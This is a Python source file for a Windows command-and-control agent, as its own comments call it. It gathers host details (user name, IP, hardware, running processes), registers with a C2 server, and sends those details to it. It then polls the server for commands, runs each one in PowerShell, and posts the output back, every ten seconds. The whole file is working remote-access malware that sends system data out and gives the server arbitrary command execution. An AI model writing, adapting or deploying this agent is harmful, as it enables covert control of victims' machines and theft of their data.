import requests
import socket
import time
import uuid
import platform
import psutil
from datetime import datetime, timedelta
import subprocess
import win32com.client
import os

# URL of the C2 server
SERVER_URL = "http://192.168.80.24:5000"

# Generate a unique agent ID
AGENT_ID = str(uuid.uuid4())

COMMANDS_FILE = "server/commands_output.json"

def get_active_ip():
    """Fetch the active IP address of the machine."""
    try:
        # Connect to an external server to determine the correct network interface
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))  # Google's public DNS server
            return s.getsockname()[0]
    except Exception:
        # Fallback if no connection is available
        return "127.0.0.1"

def bytes_to_human_readable(byte_size):
    """Convert bytes to human-readable format (GB, MB, KB)."""
    for unit in ['bytes', 'KB', 'MB', 'GB', 'TB']:
        if byte_size < 1024.0:
            return f"{byte_size:.2f} {unit}"
        byte_size /= 1024.0
    return f"{byte_size:.2f} PB"

def format_uptime(seconds):
    """Convert uptime seconds to a human-readable format (days, hours, minutes, seconds)."""
    days, rem = divmod(seconds, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, seconds = divmod(rem, 60)
    return f"{int(days)} days, {int(hours)} hours, {int(minutes)} minutes, {int(seconds)} seconds"

def get_windows_version():
    """Get the Windows version."""
    version = platform.version()  # Kernel version
    release = platform.release()  # General release (e.g., 10)
    build = os.sys.getwindowsversion().build  # Build number

    # Map of Windows builds to versions
    windows_version_map = {
        "XP": (5, 1),
        "Vista": (6, 0),
        "7": (6, 1),
        "8": (6, 2),
        "8.1": (6, 3),
        "10": (10, 0),
        "11": (10, 0),  # Distinguish by build number >= 22000
    }

    # Detect major and minor versions
    major = os.sys.getwindowsversion().major
    minor = os.sys.getwindowsversion().minor

    # Find the version name
    for name, (ver_major, ver_minor) in windows_version_map.items():
        if (major, minor) == (ver_major, ver_minor):
            if name == "10" and build >= 22000:
                return f"Windows 11 (Version: {version}, Build: {build})"
            return f"Windows {name} (Version: {version}, Build: {build})"

    # Fallback if version isn't in the map
    return f"Windows {release} (Version: {version}, Build: {build})"

def get_computer_model_with_com():
    try:
        objWMI = win32com.client.GetObject("winmgmts:\\\\.\\root\\cimv2")
        systems = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
        for system in systems:
            return system.Model
    except Exception as e:
        return f"Error: {e}"

# def run_whoami():
#     """Execute the whoami command in PowerShell and return the result."""
#     try:
#         result = subprocess.run(
#             ['powershell', '-Command', 'whoami'],
#             capture_output=True, text=True, check=True
#         )
#         return result.stdout.strip()
#     except subprocess.CalledProcessError as e:
#         return f"Error: {e}"

def get_system_info():
    """Collect detailed system information."""

    # Some data such as hostname, whoami are already obtained in register_with_server() function
    system_info = {
        'hostname': socket.gethostname(),
        'whoami': os.getlogin(),
        'ip': get_active_ip(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.architecture()[0],
        'uptime': format_uptime(time.time() - psutil.boot_time()),
        'kernel_version': platform.release(),
        'model': get_computer_model_with_com(),
    }

    # CPU info
    system_info['cpu'] = {
        'model': platform.processor(),
        'cores': psutil.cpu_count(logical=False),
        'logical_processors': psutil.cpu_count(logical=True),
        'cpu_percent': psutil.cpu_percent(interval=1),
    }

    # Memory info
    memory = psutil.virtual_memory()
    system_info['memory'] = {
        'total': bytes_to_human_readable(memory.total),
        'available': bytes_to_human_readable(memory.available),
        'used': bytes_to_human_readable(memory.used),
        'percent': memory.percent,
    }

    # Disk info
    disk = psutil.disk_usage('/')
    system_info['disk'] = {
        'total': bytes_to_human_readable(disk.total),
        'used': bytes_to_human_readable(disk.used),
        'free': bytes_to_human_readable(disk.free),
        'percent': disk.percent,
    }

    # Get running processes categorized as Apps or Background processes
    apps = []
    background_processes = []

    system_accounts = ['SYSTEM', 'LOCAL SERVICE', 'NETWORK SERVICE']
    for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
        try:
            username = proc.info['username']
            cpu_percent = proc.info['cpu_percent']
            memory_percent = proc.info['memory_percent']

            # Filter out system processes based on known system accounts
            if username in system_accounts or cpu_percent < 1 or memory_percent < 1:
                background_processes.append(proc.info)
            else:
                # Consider apps based on significant resource usage
                apps.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

    system_info['processes'] = {
        'apps': apps,
        'background_processes': background_processes
    }

    return system_info

def register_with_server():
    """Register the agent with the C2 server."""
    try:
        data = {
            "agent_id": AGENT_ID,
            "ip": get_active_ip(),
            "hostname": socket.gethostname(),
            "whoami": os.getlogin(),
            "os": get_windows_version(),
            "system_info": get_system_info()
        }
        response = requests.post(f"{SERVER_URL}/register", json=data)
        if response.status_code == 200:
            print("Registered:", response.json())
        else:
            print(f"Registration failed: {response.status_code}")
    except Exception as e:
        print("Registration error:", e)

##

# Function to execute command locally
def execute_command(command):
    """Execute a command and send its output to the server."""
    print(f"Executing: {command}")
    
    try:
        # Execute the command and capture the output
        result = subprocess.run(["powershell", "-Command", command], shell=True, capture_output=True, text=True, check=True)
        output = result.stdout
    except subprocess.CalledProcessError as e:
        # If the command fails, capture the error output
        output = f"Error: {e.stderr}"
    except Exception as e:
        # Handle any unexpected exceptions
        output = f"Unexpected error: {str(e)}"

    # Prepare the data to be sent to the server
    data = {
        "agent_id": AGENT_ID,
        "command": command,
        "output": output
    }

    # Send the command output to the server to store it
    try:
        response = requests.post(SERVER_URL+"/store_command_output", json=data)
        if response.status_code == 200:
            print(f"Command output successfully stored for agent {AGENT_ID}.")
        else:
            print(f"Failed to store command output: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending request to the server: {e}")
    
    return output

def store_command_output(agent_id, command, output):
    """Store the command and its output in a JSON file, ordered by timestamp."""
    try:
        # Load existing data from the commands.json file
        try:
            with open(COMMANDS_FILE, "r") as f:
                commands_data = json.load(f)
        except FileNotFoundError:
            commands_data = {}

        # Check if agent already has command entries
        if agent_id not in commands_data:
            commands_data[agent_id] = {}

        # Get the highest existing command ID for this agent, or start with 0 if none exists
        command_ids = list(commands_data[agent_id].keys())
        if command_ids:
            new_id = str(max(map(int, command_ids)) + 1)
        else:
            new_id = "1"

        # Save the new command output under the new command ID
        commands_data[agent_id][new_id] = {
            "command": command,
            "output": output
        }

        # Write the updated data back to the file
        with open(COMMANDS_FILE, "w") as f:
            json.dump(commands_data, f, indent=4)

        print(f"Command output for agent {agent_id} saved to {COMMANDS_FILE}.")
    except Exception as e:
        print(f"Error saving command output: {e}")

# Check for commands from the server
def check_for_commands(agent_id):
    """Check for new commands from the server."""
    try:
        response = requests.get(f"{SERVER_URL}/get_command/{agent_id}")
        if response.status_code == 200:
            command_data = response.json()
            command = command_data.get("command")
            if command:
                print(f"Executing command: {command}")
                output = execute_command(command)
                print(f"Command output: {output}")
                # Optionally send output back to server
                return output
        else:
            print("No new commands.")
    except requests.exceptions.RequestException as e:
        print(f"Error while checking for commands: {e}")
    return None

# Heartbeat function to notify server of agent's active status
def send_heartbeat(agent_id):
    """Send heartbeat to the server."""
    try:
        response = requests.post(f"{SERVER_URL}/heartbeat", json={"agent_id": agent_id})
        if response.status_code == 200:
            print("Heartbeat sent.")
    except requests.exceptions.RequestException as e:
        print(f"Error while sending heartbeat: {e}")

##

# Main loop for agent activity
if __name__ == "__main__":
    while True:
        register_with_server()
        send_heartbeat(AGENT_ID)
        check_for_commands(AGENT_ID)
        time.sleep(10)  # Adjust as needed for periodic checks